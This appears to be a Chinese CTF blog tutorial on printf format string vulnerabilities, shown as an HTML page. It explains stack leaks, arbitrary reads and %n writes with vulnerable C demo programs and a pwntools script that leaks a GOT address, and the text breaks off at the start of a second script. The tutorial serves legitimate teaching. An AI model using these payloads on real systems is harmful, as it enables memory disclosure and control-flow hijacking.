@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>格式化字符串漏洞总结 - 好好学习</title><meta name="author" content="alextang">
+<meta name="author-link" content="">
+<meta name="description" content="之前大大小小的题目中都遇到了格式化字符串漏洞，但是长时间不做还是会有点懵逼" /><meta name="keywords" content='CTF, Pwn' />
+  <meta itemprop="name" content="格式化字符串漏洞总结">
+  <meta itemprop="description" content="之前大大小小的题目中都遇到了格式化字符串漏洞，但是长时间不做还是会有点懵逼">
+  <meta itemprop="datePublished" content="2023-11-09T08:41:47+08:00">
+  <meta itemprop="dateModified" content="2023-11-09T08:41:47+08:00">
+  <meta itemprop="wordCount" content="2529">
+  <meta itemprop="keywords" content="CTF,Pwn"><meta property="og:url" content="https://alextang.top/articles/2023/11/fmt_str/">
+  <meta property="og:site_name" content="好好学习">
+  <meta property="og:title" content="格式化字符串漏洞总结">
+  <meta property="og:description" content="之前大大小小的题目中都遇到了格式化字符串漏洞，但是长时间不做还是会有点懵逼">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-11-09T08:41:47+08:00">
+    <meta property="article:modified_time" content="2023-11-09T08:41:47+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Pwn">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="格式化字符串漏洞总结">
+  <meta name="twitter:description" content="之前大大小小的题目中都遇到了格式化字符串漏洞，但是长时间不做还是会有点懵逼">
+      <meta name="twitter:site" content="@a1extang">
+<meta name="application-name" content="a1extang">
+<meta name="apple-mobile-web-app-title" content="a1extang"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://alextang.top/articles/2023/11/fmt_str/" /><link rel="prev" href="https://alextang.top/articles/2023/11/pcb2023/" /><link rel="next" href="https://alextang.top/articles/2023/11/partial_overwrite/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "格式化字符串漏洞总结",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/alextang.top\/articles\/2023\/11\/fmt_str\/"
+    },"genre": "posts","keywords": "CTF, Pwn","wordcount":  2529 ,
+    "url": "https:\/\/alextang.top\/articles\/2023\/11\/fmt_str\/","datePublished": "2023-11-09T08:41:47+08:00","dateModified": "2023-11-09T08:41:47+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "alextang"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                title="关于"
+                
+              ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  title="关于"
+                  
+                ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>格式化字符串漏洞总结</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=large 2x" sizes="auto" data-title="alextang" data-alt="alextang" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;alextang</span></span>
+          <span class="post-category">收录于 <a href="/categories/pwn/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwn</a></span></div>
+      <div class="post-meta-line"><span title="发布于 2023-11-09 08:41:47"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-11-09">2023-11-09</time></span>&nbsp;<span title="更新于 2023-11-09 08:41:47"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-11-09">2023-11-09</time></span>&nbsp;<span title="2529 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 2600 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 6 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#泄露栈内存">泄露栈内存</a></li>
+    <li><a href="#泄露任意地址内存">泄露任意地址内存</a></li>
+    <li><a href="#覆盖栈上内存地址">覆盖栈上内存地址</a></li>
+    <li><a href="#覆盖任意地址内存为小数字">覆盖任意地址内存为小数字</a></li>
+    <li><a href="#覆盖任意地址内存为大地址">覆盖任意地址内存为大地址</a></li>
+    <li><a href="#补充">补充</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>之前大大小小的题目中都遇到了格式化字符串漏洞，但是长时间不做还是会有点懵逼</p>
+<p>首先，格式化字符串的危险函数有很多，但是实际上最常用的还是<code>printf</code>。printf可以有很多参数，但是第一个固定为fmt参数。printf的参数分布和正常函数的参数分布一致：</p>
+<ul>
+<li>x86：栈</li>
+<li>x64：RDI, RSI, RDX, RCX, R8, R9, 栈</li>
+</ul>
+<p>我们知道，fmt的格式大概如下所示：</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="s">&#34;Hello %d, %s&#34;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>fmt中每遇到一个<code>%</code>后就会在下一个参数寻找值按照格式输出，无论该值是否由printf函数提供。</p>
+<p>那么，由于fmt字符串占用第一个参数，第<strong>n</strong>个<code>%</code>所寻找的参数即为printf的第<strong>n+1</strong>个参数，或者说相对于fmt字符串第<strong>n</strong>个参数。这一点需要牢记。按照此规则结合正常函数的参数储存机制即可定位指定栈位置的内容。</p>
+<div class="details admonition info open">
+    <div class="details-summary admonition-title">
+      <i class="icon fa-solid fa-info-circle fa-fw" aria-hidden="true"></i>Notice<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i>
+    </div>
+    <div class="details-content">
+      <div class="admonition-content">printf的第一个参数永远是fmt字符串，其他和正常函数一致。</div>
+    </div>
+  </div>
+<h2 id="泄露栈内存">泄露栈内存</h2>
+<p>按照上述内容，当fmt字符串可控，我们可以顺序输入栈上的数据。</p>
+<blockquote>
+<p>如果需要通过gdb定位栈位置，一定要在printf处下断点</p>
+</blockquote>
+<ul>
+<li>可以利用 <code>%x</code> 来获取对应栈的内存，但建议使用 <code>%p</code>，可以不用考虑位数的区别。</li>
+<li>利用 <code>%s</code> 来获取变量所对应地址的内容，只不过有零截断。如果该变量所对应的并不是合法的地址，程序崩溃</li>
+<li>利用<code>%n$p</code>获取栈指定位置的内容，使用<code>%n$s</code>获取栈指定位置内容所对应地址的内容。</li>
+</ul>
+<h2 id="泄露任意地址内存">泄露任意地址内存</h2>
+<blockquote>
+<p>在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。</p>
+</blockquote>
+<p>fmt字符串会按照栈单位大小将其&quot;分解&quot;后放在栈上。如果我们在格式化字符串中放上某一个内存地址，那么我们就相当于在栈上写入了需要泄露的内存地址。此时定位其位置，使用<code>%n$s</code>就可以泄露该内存地址的内容。注意：地址一定要充满栈单位，比如64位程序的栈单位是8字节，那么如果地址不满8字节需要填充至8字节。例如：</p>
+<p>那么如何确定我们写入地址的位置？这里我们使用如下程序为例：</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0x22222222</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%08x.%08x.%08x.%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>输入AAAA（因为是32位程序，四字节地址），然后使用gdb进行调试。栈布局如下所示：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109145242079.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109145242079.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109145242079.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109145242079.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109145242079.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109145242079.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>栈顶是printf的返回地址，下面则是printf的第一个参数，发现他们都指向0x14的位置，该位置数出来是printf的第5个参数，那么就相对fmt4个长度。因此，我们可以通过<code>%4$s</code>来读取地址为AAAA处的内存地址。</p>
+<p>除了使用gdb，我们可以直接输入多个<code>%p</code>来顺序打印栈上的内容，直到我们找到<code>AAAA</code>为止。如下所示：</p>
+<blockquote>
+<p>请保证输入大小够用。</p>
+</blockquote>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109150013241.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109150013241.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109150013241.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109150013241.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109150013241.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109150013241.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>数一下，刚好是第四个%p，那么相对位置就是第四个。</p>
+<p>现在，我们尝试输出<code>scanf</code>的地址：（32位libc中，scanf的名称为：<code>__isoc99_scanf</code>）</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span><span class="s1">&#39;splitw&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./stackleak&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">scanf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;__isoc99_scanf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="n">scanf_got</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;%4$s&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%4$s</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>最终确实输出了scanf的实际地址：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109151150117.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109151150117.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109151150117.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109151150117.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109151150117.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109151150117.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="覆盖栈上内存地址">覆盖栈上内存地址</h2>
+<p>这里涉及到一个格式化字符：<code>%n</code>,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p>
+<p>那么参照上面的过程，我们在输入中填充一些字符即可写入对应个数的字符。</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[addr][padding]%x$n</span></span></code></pre></td></tr></table>
+</div>
+</div><p>现有如下程序：</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* example/overflow/overflow.c */</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">123</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">456</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">789</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="mi">16</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;modified c.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;modified a for a small number.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">b</span> <span class="o">==</span> <span class="mh">0x12345678</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;modified b for a big number!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们来修改栈上变量c的值。首先使用之前的手段判断偏移：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109161123800.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109161123800.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109161123800.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109161123800.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109161123800.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109161123800.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>发现是第六个参数。由于程序本身给出了c变量的地址，那么我们直接将地址写入第六个位置即可。</p>
+<div class="highlight" id="id-6"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
